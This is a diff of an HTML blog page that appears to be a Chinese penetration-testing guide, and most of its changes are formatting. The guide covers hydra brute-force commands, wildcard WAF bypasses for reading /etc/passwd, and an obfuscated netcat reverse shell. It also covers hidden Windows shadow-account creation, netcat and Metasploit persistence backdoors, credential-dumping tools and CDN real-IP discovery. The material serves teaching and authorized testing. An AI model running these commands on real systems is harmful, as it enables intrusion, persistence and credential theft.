class="number">6</span>表示用ipv6</span></span><br><span class="line"><span class="ruby"></span>-<span class="ruby">v 	显示爆破信息</span></span><br><span class="line"><span class="ruby"></span>-<span class="ruby">M 	把要爆破的目标都写到一个文件中,每行对应一个目标,支持域名,CIDR格式,或者单个ip的形式</span></span><br></pre></td></tr></table></figure>
+<p>  hydra可以运行在Linux, Windows&#x2F;Cygwin, Solaris, FreeBSD&#x2F;OpenBSD, QNX (Blackberry 10) and MacOS</p>
+<p>  支持的协议包括：Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP&#x2F;R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP</p>
+  <figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">-R	从上次未完成的爆破文件[hydra.restore]中读取爆破进度并接着上次的进度继续往后爆破</span></span><br><span class="line"><span class="deletion">-S 	爆破https时需要加上该选项</span></span><br><span class="line"><span class="deletion">-s 	如果要爆破的服务用的不是默认端口,可以用这个来手工指定服务端口号</span></span><br><span class="line"><span class="deletion">-l/-L 	指定用户名 / 指定用户名字典文件</span></span><br><span class="line"><span class="deletion">-p/-P 	指定密码 / 指定密码字典文件[字典务必要自己精心准备,别人的始终不适合自己的环境]</span></span><br><span class="line"><span class="deletion">-e 	尝试空密码[n]/尝试将用户名作为密码[s]/尝试将用户名和密码位置调换爆破[r]</span></span><br><span class="line"><span class="deletion">-f/-F 	当爆出第一个正确的密码后,就自动退出程序,-f表示单个&#x27;进程&#x27;退出,-F表示全局退出</span></span><br><span class="line"><span class="deletion">-t 	指定爆破进程,实际爆破中给8个左右即可,太高了容易报警,速度慢不怕,就怕动静儿太大,这里只是个参考,如果目标内网环境相对比较松,可以适当再放大一点,当然,肯定不能    无限大,基于目标系统而定,大家酌情使用吧</span></span><br><span class="line"><span class="deletion">-w 	设定超时时长,默认32秒,一般情况10秒即可</span></span><br><span class="line"><span class="deletion">-4/-6 	4表示用ipv4,6表示用ipv6</span></span><br><span class="line"><span class="deletion">-v 	显示爆破信息</span></span><br><span class="line"><span class="deletion">-M 	把要爆破的目标都写到一个文件中,每行对应一个目标,支持域名,CIDR格式,或者单个ip的形式</span></span><br></pre></td></tr></table></figure>
 <p>  针对各类服务的实例爆破演示</p>
-  <figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># hydra -L user.txt -P pass.txt -f -v -t 20 mssql:<span class="comment">//192.168.1.2</span></span></span><br><span class="line"><span class="meta"># hydra -l root -P pass.txt -f -v -t 20 mysql:<span class="comment">//192.168.1.2</span></span></span><br><span class="line"><span class="meta"># hydra -L user.txt -P pass.txt -f -v -t 20 smb:<span class="comment">//192.168.1.2</span></span></span><br><span class="line"><span class="meta"># hydra -L user.txt -P pass.txt -f -v -t 20 postgres:<span class="comment">//192.168.1.2</span></span></span><br><span class="line"><span class="meta"># hydra -L user.txt -P pass.txt -f -v -t 20 rdp:<span class="comment">//192.168.1.2</span></span></span><br><span class="line"><span class="meta"># hydra -l root -P pass.txt -f -v -t 20 ssh:<span class="comment">//192.168.1.2</span></span></span><br><span class="line"><span class="meta"># hydra -L user.txt -P pass.txt -f -v -t 20 ftp:<span class="comment">//192.168.1.2</span></span></span><br></pre></td></tr></table></figure></li>
+  <figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># hydra -L user.txt -P pass.txt -f -v -t 20 mssql:<span class="comment">//192.168.1.2</span></span></span><br><span class="line"><span class="meta"># hydra -l root -P pass.txt -f -v -t 20 mysql:<span class="comment">//192.168.1.2</span></span></span><br><span class="line"><span class="meta"># hydra -L user.txt -P pass.txt -f -v -t 20 smb:<span class="comment">//192.168.1.2</span></span></span><br><span class="line"><span class="meta"># hydra -L user.txt -P pass.txt -f -v -t 20 postgres:<span class="comment">//192.168.1.2</span></span></span><br><span class="line"><span class="meta"># hydra -L user.txt -P pass.txt -f -v -t 20 rdp:<span class="comment">//192.168.1.2</span></span></span><br><span class="line"><span class="meta"># hydra -l root -P pass.txt -f -v -t 20 ssh:<span class="comment">//192.168.1.2</span></span></span><br><span class="line"><span class="meta"># hydra -L user.txt -P pass.txt -f -v -t 20 ftp:<span class="comment">//192.168.1.2</span></span></span><br></pre></td></tr></table></figure>
+</li>
 <li><p>越权访问</p>
 <p>  越权访问又包括水平越权和垂直访问，这种漏洞我们可以观察url是否带有用户的明文信息或者直接访问一些敏感页面</p>
 </li>
@@ -874,11 +859,11 @@ function showBtn(){
 <li>过滤掉、；，[,],|,&lt;,&gt;,\之类的符号；</li>
 <li>设置用户的权限。</li>
 </ul>
-<p>  linux命令执行绕过过滤/waf技巧</p>
+<p>  linux命令执行绕过过滤&#x2F;waf技巧</p>
 <p>  主要利用了bash的通配符、连接符、未初始化的变量三个特性来绕过WAF规则</p>
 <ul>
 <li><p>通配符<br>  在bash的操作环境中有一个非常有用的功能，那就是通配符，下面列出一些常用的通配符：</p>
-  <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*    代表『 <span class="selector-tag">0</span> 个到无穷多个』任意字符</span><br><span class="line">?    代表『一定有一个』任意字符</span><br><span class="line"><span class="selector-attr">[ ]</span>    同样代表『一定有一个在括号内』的字符(非任意字符)。例如 <span class="selector-attr">[abcd]</span> 代表『一定有一个字符， 可能是 <span class="selector-tag">a</span>, <span class="selector-tag">b</span>, <span class="selector-tag">c</span>, <span class="selector-tag">d</span> 这四个任何一个』</span><br><span class="line"><span class="selector-attr">[ - ]</span>    若有减号在中括号内时，代表『在编码顺序内的所有字符』。例如 <span class="selector-attr">[0-9]</span> 代表 <span class="selector-tag">0</span> 到 <span class="selector-tag">9</span> 之间的所有数字，因为数字的语系编码是连续的！</span><br><span class="line"><span class="selector-attr">[^ ]</span>    若中括号内的第一个字符为指数符号 (^) ，那表示『反向选择』，例如 <span class="selector-attr">[^abc]</span> 代表 一定有一个字符，只要是非 <span class="selector-tag">a</span>, <span class="selector-tag">b</span>, <span class="selector-tag">c</span> 的其他字符就接受的意思。</span><br></pre></td></tr></table></figure>
+  <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*    代表『 <span class="number">0</span> 个到无穷多个』任意字符</span><br><span class="line">?    代表『一定有一个』任意字符</span><br><span class="line"><span class="selector-attr">[ ]</span>    同样代表『一定有一个在括号内』的字符(非任意字符)。例如 <span class="selector-attr">[abcd]</span> 代表『一定有一个字符， 可能是 <span class="selector-tag">a</span>, <span class="selector-tag">b</span>, c, d 这四个任何一个』</span><br><span class="line"><span class="selector-attr">[ - ]</span>    若有减号在中括号内时，代表『在编码顺序内的所有字符』。例如 <span class="selector-attr">[0-9]</span> 代表 <span class="number">0</span> 到 <span class="number">9</span> 之间的所有数字，因为数字的语系编码是连续的！</span><br><span class="line"><span class="selector-attr">[^ ]</span>    若中括号内的第一个字符为指数符号 (^) ，那表示『反向选择』，例如 <span class="selector-attr">[^abc]</span> 代表 一定有一个字符，只要是非 <span class="selector-tag">a</span>, <span class="selector-tag">b</span>, c 的其他字符就接受的意思。</span><br></pre></td></tr></table></figure>
 <p>  比如可以使用</p>
 <p>  <code>ls -l</code> 替换成<code>/?in/?s -l</code> <br><br>  <code>cat /etc/passwd</code> 替换成 <code>/?in/cat /?tc/p?sswd</code> <br><br>  <code>nc -e /bin/bash 127.0.0.1 3737</code> 替换成 <code>/??n/?c -e /??n/b??h 2130706433 3737</code></p>
 </li>
@@ -894,8 +879,6 @@ function showBtn(){
 <li><p>SSRF</p>
 <p>  SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p>
 </li>
-</ul>
-<ul>
 <li><p>参数</p>
 <p>  参数超长是否导致溢出、参数有特殊字符是否会导致程序报错、参数确实是否导致程序报错</p>
 </li>
@@ -995,9 +978,9 @@ function showBtn(){
 <ul>
 <li><p>系统漏洞提权</p>
 <ul>
-<li><strong>Windows平台：</strong> 可以通过systeminfo查看系统版本和补丁记录，或使用提权辅助工具<a target="_blank" rel="noopener" href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">Windows-Exploit-Suggester</a>，参考<a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">SecWiki/windows-kernel-exploits</a></li>
-<li><strong>Linux平台:</strong> uname -a 查看系统内核版本，如脏牛漏洞，参考<a target="_blank" rel="noopener" href="https://github.com/SecWiki/linux-kernel-exploits">SecWiki/linux-kernel-exploits</a></li>
-<li><strong>MacOS平台:</strong> 参考<a target="_blank" rel="noopener" href="https://github.com/SecWiki/macos-kernel-exploits">SecWiki/macos-kernel-exploits</a></li>
+<li><strong>Windows平台：</strong> 可以通过systeminfo查看系统版本和补丁记录，或使用提权辅助工具<a target="_blank" rel="noopener" href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">Windows-Exploit-Suggester</a>，参考<a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">SecWiki&#x2F;windows-kernel-exploits</a></li>
+<li><strong>Linux平台:</strong> uname -a 查看系统内核版本，如脏牛漏洞，参考<a target="_blank" rel="noopener" href="https://github.com/SecWiki/linux-kernel-exploits">SecWiki&#x2F;linux-kernel-exploits</a></li>
+<li><strong>MacOS平台:</strong> 参考<a target="_blank" rel="noopener" href="https://github.com/SecWiki/macos-kernel-exploits">SecWiki&#x2F;macos-kernel-exploits</a></li>
 </ul>
 </li>
 <li><p>数据库提权</p>
@@ -1013,7 +996,7 @@ function showBtn(){
 <p>  在windows下可以使用BeRoot工具进行系统配置检查，利用配置错误点进行提权。 </p>
 </li>
 <li><p>获取或嗅探高权限账号提权</p>
-<p>  利用LaZagne project（支持linux、windows、mac），可以抓取chats、mails、database、wifi、sysadmin、wallet、browsers、memory中的密码，可以利用抓取到的密码进行高权限帐号密码测试，也可以利用神器mimikatz和mimipenguin，不过在部分时候由于权限问题可能读取不到部分密码。 </p>
+<p>  利用LaZagne project（支持linux、windows、mac），可以抓取chats、mails、database、wifi、sysadmin、wallet、browsers、memory中的密码，可以利用抓取到的密码进行高权限帐号密码测试，也可以利用神器mimikatz和mimipenguin，不过在部分时候由于权限问题可能读取不到部分密码。</p>
 </li>
 </ul>
 </li>
@@ -1026,7 +1009,7 @@ function showBtn(){
 </li>
 <li><p>账号维权，获取用户名密码，或自建隐藏账号 </p>
 <p>  Window 影子账号创建</p>
-  <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>. 通过net user xxx$ <span class="number">123</span> /add </span><br><span class="line"><span class="attribute">2</span>. 打开注册表，找到HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/，双击Administrator记住类型下面的十六进制值<span class="number">0</span>x<span class="number">1</span>f<span class="number">4</span>找到左侧对应得文件夹即<span class="number">000001</span>F<span class="number">4</span>，双击打开复制里面F下的所有内容。 将内容复制到xxx$ 对应的文件夹下面，然后将xxx$ 和<span class="number">00000</span>XXX 导出注册表</span><br><span class="line"><span class="attribute">3</span>. 接着删除xxx$ 用户 net user xxx$ /del</span><br><span class="line"><span class="attribute">4</span>. 双击导入刚才导出的两个注册表</span><br></pre></td></tr></table></figure></li>
+  <figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. 通过net <span class="keyword">user</span> <span class="title">xxx</span>$ <span class="number">123</span> /add </span><br><span class="line"><span class="number">2</span>. 打开注册表，找到HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/，双击Administrator记住类型下面的十六进制值<span class="number">0</span>x1f4找到左侧对应得文件夹即<span class="number">000001</span>F4，双击打开复制里面F下的所有内容。 将内容复制到xxx$ 对应的文件夹下面，然后将xxx$ 和<span class="number">00000</span>XXX 导出注册表</span><br><span class="line"><span class="number">3</span>. 接着删除xxx$ 用户 net <span class="keyword">user</span> <span class="title">xxx</span>$ /del</span><br><span class="line"><span class="number">4</span>. 双击导入刚才导出的两个注册表</span><br></pre></td></tr></table></figure></li>
 <li><p>常用的远程控制软件</p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework">msf</a> </li>
@@ -1042,9 +1025,9 @@ function showBtn(){
 <li><a target="_blank" rel="noopener" href="https://github.com/quasar/QuasarRAT">Quasar</a></li>
 </ul>
 <p>  nc</p>
-  <figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">服务器监听<span class="number">4444</span>端口 nc -lvvp <span class="number">4444</span></span><br><span class="line"></span><br><span class="line">目标执行 nc -t -e cmd.exe <span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span> <span class="number">4444</span> ，并添加开机启动</span><br></pre></td></tr></table></figure>
-<p>  msf</p>
-  <figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">先获得一个Meterpretershell</span><br><span class="line">利用 Persistence模块</span><br><span class="line"><span class="keyword">run </span>persistence -U -i 10 -p 4444 -r <span class="meta">x</span>.<span class="meta">x</span>.<span class="meta">x</span>.<span class="meta">x</span></span><br><span class="line"></span><br><span class="line">    -U：设置后门在用户登录后自启动。该方式会在HKCU\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息。推荐使用该参数；</span><br><span class="line">    -i：设置反向连接间隔时间，单位为秒；</span><br><span class="line">    -p：设置反向连接的端口号；</span><br><span class="line">    -r：设置反向连接的ip地址。</span><br><span class="line"></span><br><span class="line">Metsvc 模块</span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">run </span>metsvc -A</span><br><span class="line">直接在目标主机上开启一个服务</span><br><span class="line">利用handler下的windows/metsvc_bind_tcp模块，重新获得shell</span><br></pre></td></tr></table></figure></li>
+  <figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">服务器监听<span class="number">4444</span>端口 nc -lvvp <span class="number">4444</span></span><br><span class="line"></span><br><span class="line">目标执行 nc -t -e cmd.exe <span class="variable language_">x</span>.<span class="variable language_">x</span>.<span class="variable language_">x</span>.<span class="variable language_">x</span> <span class="number">4444</span> ，并添加开机启动</span><br></pre></td></tr></table></figure>
+<p>  msf<br>  <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">先获得一个Meterpretershell</span><br><span class="line">利用 Persistence模块</span><br><span class="line">run persistence -U -<span class="selector-tag">i</span> <span class="number">10</span> -<span class="selector-tag">p</span> <span class="number">4444</span> -<span class="attribute">r</span> <span class="attribute">x</span><span class="selector-class">.x</span><span class="selector-class">.x</span><span class="selector-class">.x</span></span><br><span class="line"></span><br><span class="line">    -U：设置后门在用户登录后自启动。该方式会在HKCU\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息。推荐使用该参数；</span><br><span class="line">    -<span class="selector-tag">i</span>：设置反向连接间隔时间，单位为秒；</span><br><span class="line">    -<span class="selector-tag">p</span>：设置反向连接的端口号；</span><br><span class="line">    -<span class="attribute">r</span>：设置反向连接的ip地址。</span><br><span class="line"></span><br><span class="line">Metsvc 模块</span><br><span class="line"></span><br><span class="line">run metsvc -<span class="selector-tag">A</span></span><br><span class="line">直接在目标主机上开启一个服务</span><br><span class="line">利用handler下的windows/metsvc_bind_tcp模块，重新获得shell</span><br></pre></td></tr></table></figure></p>
+</li>
 </ul>
 </li>
 <li><p>内网渗透</p>
@@ -1071,6 +1054,7 @@ function showBtn(){
 <li>可以对原始系统生成镜像环境，然后对镜像环境进行测试</li>
 <li>明确渗透测试范围</li>
 </ol>
+<p> <a href="http://www.pa55w0rd.online/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">http://www.pa55w0rd.online/渗透测试/</a> </p>
 
         
 <!--
@@ -1101,7 +1085,7 @@ function showBtn(){
 <li>确定规则：能渗透到什么程度，时间？能否修改上传？能否提权？哪些社工手段不能使用等。</li>
 <li>确定需求：web应用的漏洞(新上线程序)？业务逻辑漏洞（针对业务的）？人员权限管理漏洞（针对人员、权限）？等等。（立体全方位）</li>
 </ul>
-<p>不会些什么长篇大论，都是CV的，现在在甲方，渗透尽量在不影响业务系统正常运行的前提下进行一次完整的测试，需要全面测试，不能只测出来几个漏洞应付了事了。当然，版本迭代/新业务线啥的一般都是在测试环境上做了，线上的主要看有没有配置问题（服务器/中间件等安全基线这块都没做）</p>
+<p>不会些什么长篇大论，都是CV的，现在在甲方，渗透尽量在不影响业务系统正常运行的前提下进行一次完整的测试，需要全面测试，不能只测出来几个漏洞应付了事了。当然，版本迭代&#x2F;新业务线啥的一般都是在测试环境上做了，线上的主要看有没有配置问题（服务器&#x2F;中间件等安全基线这块都没做）</p>
 <h2 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02 信息收集"></a>0x02 信息收集</h2><p>在对一个站进行渗透测试的过程中，信息收集是非常重要的。信息收集的详细与否可能决定着此次渗透测试的结果，知己知彼，百战不殆。</p>
 <p>信息搜集分为主动信息搜集和被动信息搜集。</p>
 <p>主动信息搜集就是通过直接访问和扫描信息的方式进行收集信息，缺点是会记录自己的操作信息；被动信息搜集就是通过第三方服务进行信息搜集，缺点是收集信息有限。</p>
@@ -1112,7 +1096,7 @@ function showBtn(){
 <li><p><strong>ping顶级域名或子域名</strong>，一般企业都只会对www域名做cdn，而常常忽略了空域名和子域名,确定了没有使用CDN的二级域名后，本地将目标域名绑定到同ip，能访问就说明目标站与二级域名在同一服务器，也可能在同C段，扫描C段所有开80端口的ip，挨个尝试</p>
 </li>
 <li><p><strong>查询历史dns记录</strong>,如果存在做了cdn之前的历史记录也是可以查到真实ip的，相关查询网站有：</p>
- <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>dnsdb.io<span class="regexp">/zh-cn/</span></span><br><span class="line">https:<span class="regexp">//</span>x.threatbook.cn/</span><br><span class="line">http:<span class="regexp">//</span>toolbar.netcraft.com/site_report?url=</span><br><span class="line">http:<span class="regexp">//</span>viewdns.info/</span><br><span class="line">http:<span class="regexp">//</span>whoisrequest.com<span class="regexp">/history/</span></span><br><span class="line">https:<span class="regexp">//</span>tools.ipip.net/cdn.php</span><br><span class="line">https:<span class="regexp">//</span>securitytrails.com/</span><br></pre></td></tr></table></figure></li>
+ <figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span><span class="comment">//dnsdb.io/zh-cn/</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//x.threatbook.cn/</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//toolbar.netcraft.com/site_report?url=</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//viewdns.info/</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//whoisrequest.com/history/</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//tools.ipip.net/cdn.php</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//securitytrails.com/</span></span><br></pre></td></tr></table></figure></li>
 <li><p>DNS社工库 <em>Ps.和查询历史dns记录道理一样，没有相关的裤子</em></p>
 </li>
 <li><p>还可以使用对方的邮件服务（如注册激活邮件、找回密码），站点的sendmail功能或者是rss订阅服务，当目标给你发送了一条消息也可以从消息中找到真实ip</p>
@@ -1126,7 +1110,8 @@ function showBtn(){
 <li><p>通过各种漏洞或其他方式想办法让目标反向连接我们，比如命令执行反弹shell、ssrf漏洞、xss盲打后台，被动和目标数据库建立连接等等</p>
 </li>
 <li><p>使用<code>nslookup</code>或<code>dig</code>更改dns为国外的不知名的dns服务器来解析目标域名的各种记录（ns、a、mx等）可能查到其真实ip</p>
- <figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">收集的部分国外dns服务器</span><br><span class="line"><span class="number">209.244.0.3</span></span><br><span class="line"><span class="number">64.6.64.6</span></span><br><span class="line"><span class="number">8.8.8.8</span></span><br><span class="line"><span class="number">9.9.9.9</span></span><br><span class="line"><span class="number">8.26.56.26</span></span><br><span class="line"><span class="number">199.85.126.10</span></span><br><span class="line"><span class="number">208.67.222.222</span></span><br><span class="line"><span class="number">195.46.39.39</span></span><br><span class="line"><span class="number">69.195.152.204</span></span><br><span class="line"><span class="number">208.76.50.50</span></span><br><span class="line"><span class="number">216.146.35.35</span></span><br><span class="line"><span class="number">37.235.1.174</span></span><br><span class="line"><span class="number">198.101.242.72</span></span><br><span class="line"><span class="number">77.88.8.8</span></span><br><span class="line"><span class="number">91.239.100.100</span></span><br><span class="line"><span class="number">74.82.42.42</span></span><br><span class="line"><span class="number">109.69.8.51</span></span><br><span class="line"><span class="number">156.154.70.1</span></span><br><span class="line"><span class="number">1.1.1.1</span></span><br><span class="line"><span class="number">45.77.165.194</span></span><br></pre></td></tr></table></figure></li>
+ <figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">收集的部分国外dns服务器</span><br><span class="line"><span class="number">209.244.0.3</span></span><br><span class="line"><span class="number">64.6.64.6</span></span><br><span class="line"><span class="number">8.8.8.8</span></span><br><span class="line"><span class="number">9.9.9.9</span></span><br><span class="line"><span class="number">8.26.56.26</span></span><br><span class="line"><span class="number">199.85.126.10</span></span><br><span class="line"><span class="number">208.67.222.222</span></span><br><span class="line"><span class="number">195.46.39.39</span></span><br><span class="line"><span class="number">69.195.152.204</span></span><br><span class="line"><span class="number">208.76.50.50</span></span><br><span class="line"><span class="number">216.146.35.35</span></span><br><span class="line"><span class="number">37.235.1.174</span></span><br><span class="line"><span class="number">198.101.242.72</span></span><br><span class="line"><span class="number">77.88.8.8</span></span><br><span class="line"><span class="number">91.239.100.100</span></span><br><span class="line"><span class="number">74.82.42.42</span></span><br><span class="line"><span class="number">109.69.8.51</span></span><br><span class="line"><span class="number">156.154.70.1</span></span><br><span class="line"><span class="number">1.1.1.1</span></span><br><span class="line"><span class="number">45.77.165.194</span></span><br></pre></td></tr></table></figure>
+</li>
 <li><p>让服务器去访问你的vps，比如说这个网址有设置头像的方式，并且可以直接填写头像的url，或者插入远程图片，那么我们可以把图片放在自己vps上提交给服务器，那么也可以从日志中得到真实ip</p>
 </li>
 <li><p>DDOS，耗尽CDN流量，回源之后找到真实ip。不设防的cdn量大就会挂，高防CDN要增大流量 <em>Ps.没有资源，现在防ddos也比较强，没尝试过</em></p>
@@ -1135,14 +1120,12 @@ function showBtn(){
 </li>
 <li><p>全网扫描zmap，使用 Zmap 的 banner-grab 扫描出来 80 端口开放的主机进行 banner 抓取，最后在 http-req 中的 Host字段匹配相关域名 <em>Ps.因造成网络拥堵，后续没有尝试</em></p>
 </li>
-<li><p>通过shadan/zoomeye/fofa搜索网站特殊标题、内容、网站源码</p>
+<li><p>通过shadan&#x2F;zoomeye&#x2F;fofa搜索网站特殊标题、内容、网站源码</p>
 </li>
 <li><p>cloudflare，如<a target="_blank" rel="noopener" href="https://github.com/m0rtem/CloudFail">CloudFail</a>、<a target="_blank" rel="noopener" href="http://www.freebuf.com/articles/web/41533.html">CloudFlare防护下的破绽：寻找真实IP的几条途径</a>、<a target="_blank" rel="noopener" href="http://crimeflare.net:83/cfssl.html">http://crimeflare.net:83/cfssl.html(需要翻墙)</a></p>
 </li>
 </ol>
 </li>
-</ul>
-<ul>
 <li><p>whois信息查询</p>
 <p>  当拿到一个域名的时候，我们首先应该进行whois查询，可以使kali 下面的 whois命令或者使用<a target="_blank" rel="noopener" href="http://whois.chinaz.com/">chinaz在线工具</a>，whois信息可以获取关键注册人的信息，包括注册公司、注册邮箱、管理员邮箱、管理员联系手机等,对后期社工很有用，还可以查询同一注册人注册的其他的域名，域名对应的NS记录、MX记录，自动识别国内常见的托管商（万网、新网等）。或者我们可以有针对性的利用其信息生成字典，对后台或者其他登录功能进行爆破。</p>
 <p>  who.is：<a target="_blank" rel="noopener" href="https://who.is/">https://who.is/</a> </p>
@@ -1156,17 +1139,17 @@ function showBtn(){
 <li><p>旁站C段查询</p>
 <p>  旁站是和目标网站在同一台服务器上的其它的网站；如果从目标站本身找不到好的入手点，这时候，如果想快速拿下目标的话，一般都会先找个目标站点所在服务器上其他的比较好搞的站下手，然后再想办法跨到真正目标的站点目录中。C段是和目标机器ip处在同一个C段的其它机器；通过目标所在C段的其他任一台机器，想办法跨到我们的目标机器上。常用的工具有<a target="_blank" rel="noopener" href="http://www.cnblogs.com/dongchi/p/4155368.html">ip反查</a>，Nmap，Zenmap。</p>
 </li>
-<li><p>指纹识别/网站架构探测</p>
-<p>  通过指纹识别，我们可以明确这个网站服务器是用什么操作系统（win/linux）<br></p>
+<li><p>指纹识别&#x2F;网站架构探测</p>
+<p>  通过指纹识别，我们可以明确这个网站服务器是用什么操作系统（win&#x2F;linux）<br></p>
 <ul>
 <li>TTL</li>
 <li>路径大小写</li>
-<li>访问不存在的页面<br>针对一个web服务，我们应该首先明确这个是由什么语言开发的前后端，常见脚本语言有php/asp/aspx/jsp等</li>
+<li>访问不存在的页面<br>  针对一个web服务，我们应该首先明确这个是由什么语言开发的前后端，常见脚本语言有php&#x2F;asp&#x2F;aspx&#x2F;jsp等</li>
 <li>respone包头</li>
-<li>index.php/index.jsp/index.asp</li>
+<li>index.php&#x2F;index.jsp&#x2F;index.asp</li>
 <li>爬虫爬取网站结构，看xx.jsp?等</li>
 </ul>
-<p>  使用的什么webserver版本和类型，因为不同的webserver也有不同的解析漏洞或者其他的漏洞，常见的服务器包括apache/tomcat/iis/nginx。<br></p>
+<p>  使用的什么webserver版本和类型，因为不同的webserver也有不同的解析漏洞或者其他的漏洞，常见的服务器包括apache&#x2F;tomcat&#x2F;iis&#x2F;nginx。<br></p>
 <ul>
 <li>使用浏览器插件(wappalyzer)可以很方便的查看这些信息<br></li>
